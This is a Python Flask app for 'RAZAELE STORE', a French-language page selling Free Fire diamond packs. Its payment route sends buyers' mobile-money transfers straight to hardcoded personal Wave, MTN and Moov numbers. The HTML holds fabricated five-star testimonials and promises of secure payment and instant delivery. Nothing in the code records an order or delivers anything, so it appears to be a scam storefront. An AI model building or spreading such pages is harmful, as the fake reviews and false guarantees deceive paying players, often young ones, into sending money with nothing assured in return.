from flask import Flask, render_template_string, request, redirect
import urllib.parse
import os

app = Flask(__name__)

# === REMPLACE AVEC TES VRAIS NUMÉROS ICI ===
MON_NUMERO_WAVE = "2250500853322"  
MON_NOM_WAVE = "JEANVIRUS"    
MON_NUMERO_MTN = "0500853322"     
MON_NUMERO_MOOV = "0170510049"   
# ===========================================

HTML = '''
<!DOCTYPE html>
<html>
<head><title>RAZAELE STORE</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body{background:#000;color:#fff;font-family:Arial;text-align:center;padding:20px}
h1{color:#00ffff;text-shadow:0 0 15px #00ffff}
input,select{width:100%;padding:15px;margin:10px 0;border-radius:10px;border:2px solid #00ffff;background:#001414;color:#fff;font-size:16px}
.btn{width:100%;padding:16px;border-radius:12px;font-weight:bold;font-size:18px;border:none;margin-top:15px}
.btn-wave{background:#1DC9FF;color:#000}.btn-mtn{background:#FFCC00;color:#000}.btn-moov{background:#0066CC;color:white}
label{display:block;text-align:left;margin-top:15px;color:#00ffff}
</style></head>
<body>
<div style="text-align:right;margin-bottom:10px;">
  <button onclick="switchLang()" style="padding:8px 12px;border:none;border-radius:6px;background:#eee;cursor:pointer;">🇫🇷 / 🇬🇧</button>
</div>
<img src="logo.png" alt="RAZAELE" style="width:150px;margin:10px auto 20px;display:block;">
<h1 id="titre">💎 PAIEMENT RAZAELE STORE 💎</h1>
<form action="/payer" method="POST">
<label>1. Choisis ton pack :</label>
<select name="montant" required>
<option value="900">100 + 10 Diamants = 900 CFA</option>
<option value="2550">310 + 31 Diamants = 2 550 CFA</option>
<option value="4250">520 + 52 Diamants = 4 250 CFA</option>
<option value="8050">1060 + 106 Diamants = 8 050 CFA</option>
<option value="16000">2180 + 218 Diamants = 16 000 CFA</option>
<option value="40600">5600 + 560 Diamants = 40 600 CFA</option>
</select>
<label>2. Ton ID Free Fire :</label>
<input type="text" name="id_client" placeholder="ID Free Fire" required>
<button type="submit" name="operateur" value="wave" class="btn btn-wave">Payer avec Wave</button>
<button type="submit" name="operateur" value="mtn" class="btn btn-mtn">Payer avec MTN Money</button>
<button type="submit" name="operateur" value="moov" class="btn btn-moov">Payer avec Moov Money</button>
<a href="https://wa.me/22509456272?text=Bonjour%20RAZAELE%20STORE" target="_blank" style="display:block;padding:16px;margin:12px 0;color:white;text-decoration:none;border-radius:8px;font-weight:bold;background-color:#25D366;text-align:center;">💬 Contacter sur WhatsApp</a>
<p style="font-size:13px;color:#666;text-align:center;margin:15px 0 5px;">
  🔒 Paiement 100% sécurisé | ✅ Service client 24/7 | ⚡ Livraison instantanée
</p>
<div style="margin:25px 0;padding:15px;background:#f8f9fa;border-radius:10px;border-left:4px solid #25D366;">
  <p style="margin:0 0 8px;font-weight:bold;">⭐⭐⭐⭐⭐ Kouadio M.</p>
  <p style="margin:0;font-size:14px;color:#444;">"Reçu mes 520 diamants en 2min chrono. Service au top, je recommande !"</p>
</div>

<div style="margin:15px 0;padding:15px;background:#f8f9fa;border-radius:10px;border-left:4px solid #25D366;">
  <p style="margin:0 0 8px;font-weight:bold;">⭐⭐⭐⭐⭐ Aïcha K.</p>
  <p style="margin:0;font-size:14px;color:#444;">"J'avais peur d'une arnaque mais tout est arrivé. Merci RAZAELE STORE"</p>
</div>
</form><script>
function switchLang() {
  let titre = document.getElementById('titre');
  if (titre.innerText.includes('PAIEMENT')) {
    titre.innerText = '💎 RAZAELE STORE PAYMENT 💎';
    document.querySelector('label').innerText = 'Choose your pack';
  } else {
    titre.innerText = '💎 PAIEMENT RAZAELE STORE 💎';
    document.querySelector('label').innerText = 'Choisis ton pack';
  }
}
</script>
</body></html>
'''

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/payer', methods=['POST'])
def payer():
    montant = request.form['montant']
    operateur = request.form['operateur']
    id_client = request.form['id_client']
    if operateur == 'wave':
        nom = urllib.parse.quote(MON_NOM_WAVE)
        note = urllib.parse.quote(f"Diamants FF ID:{id_client}")
        return redirect(f"https://send.wave.com/transfer?amount={montant}&recipient={MON_NUMERO_WAVE}&name={nom}&note={note}")
    elif operateur == 'mtn':
        return redirect(f"tel:*133*1*{MON_NUMERO_MTN}*{montant}#")
    elif operateur == 'moov':
        return redirect(f"tel:*155*1*1*{MON_NUMERO_MOOV}*{montant}#")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
